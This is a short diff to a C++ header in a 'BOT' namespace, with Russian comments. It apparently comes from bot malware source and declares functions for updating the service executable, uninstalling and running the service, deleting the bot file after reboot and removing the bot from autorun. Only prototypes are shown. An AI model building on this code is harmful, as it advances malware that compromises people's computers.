@@ -211,6 +211,11 @@ namespace BOT
 	bool UninstallService();
 
 	//----------------------------------------------------
+	// UpdateService - Функция обновляет ехе сервиса
+	//----------------------------------------------------
+    bool UpdateService(const char* FileName);
+
+	//----------------------------------------------------
 	// ExecuteService - Функция запускает выполнение
 	//                  сервиса
 	//----------------------------------------------------
@@ -265,7 +270,7 @@ namespace BOT
 	// DeleteAfterReboot - В случае неудачи указаь системе о необходимости
 	// удаления файла после ребута
 
-	void DeleteBotFile( const char* FileName, DWORD TimeOut = 0, bool DeleteAfterReboot = true);
+	bool DeleteBotFile( const char* FileName, DWORD TimeOut = 0, bool DeleteAfterReboot = true);
 
 	//удаляет бота из автозагрузки
 	void DeleteAutorunBot();
